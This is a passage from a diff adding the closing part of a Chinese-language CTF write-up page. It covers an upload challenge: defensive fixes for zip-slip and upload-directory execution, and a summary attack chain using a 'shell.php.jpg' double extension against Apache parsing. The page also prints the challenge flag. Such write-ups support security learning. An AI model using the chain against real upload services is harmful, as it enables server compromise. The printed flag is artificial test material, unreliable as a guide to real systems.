+        <div class="fix-row"><span class="fix-icon">3</span><span>解压前拒绝 <span class="code-term">../</span>、斜杠、反斜杠和绝对路径；或启用可靠的目录限制。</span></div>
+        <div class="fix-row"><span class="fix-icon">4</span><span>上传目录关闭脚本执行权限；Apache 用 <span class="code-term">FilesMatch</span> 精确限制 PHP 处理。</span></div>
+      </div>
+      <div class="safe-box write-in" style="animation-delay:2.9s">
+        <div class="safe-row"><span class="safe-check">OK</span><span>文件内容检查、文件名随机化、存储目录禁执行，三层防线缺一不可。</span></div>
+        <div class="safe-row"><span class="safe-check">OK</span><span>后端行为要与反向代理规则一起验证，避免“前端过滤通过、后端解释器执行”的错位。</span></div>
+      </div>
+    </div>
+
+    <!-- 7. 总结 -->
+    <div class="summary-box write-in" style="animation-delay:3.05s">
+      <div class="summary-title">一条线背下来</div>
+      <div class="content">
+        <div class="flow-box"><span class="flow-item">源码泄露</span><span class="flow-arrow">→</span><span class="flow-item">后缀只看最后一段</span><span class="flow-arrow">→</span><span class="flow-item">shell.php.jpg</span><span class="flow-arrow">→</span><span class="flow-item">Apache 找到 .php</span><span class="flow-arrow">→</span><span class="flow-item">执行并取 Flag</span></div>
+        <div class="urgent-box">Flag：<span class="code-term">n1book{ThisIsUpLoadToPicfl4g}</span></div>
+        <p><span class="badge green">核心考点</span> 源码泄露、上传白名单缺陷、Apache 多后缀解析、PclZip zip-slip、清理范围不完整。</p>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.style.animationPlayState = 'running';
+        }
+      });
+    }, { threshold: 0.1 });
+
+    document.querySelectorAll('.write-in').forEach(el => {
+      el.style.animationPlayState = 'paused';
+      observer.observe(el);
+    });
+
+    setTimeout(() => {
+      document.querySelectorAll('.write-in').forEach(el => {
+        el.style.animationPlayState = 'running';
+      });
+    }, 100);
+  });
+</script>
+
+</body>
+</html>
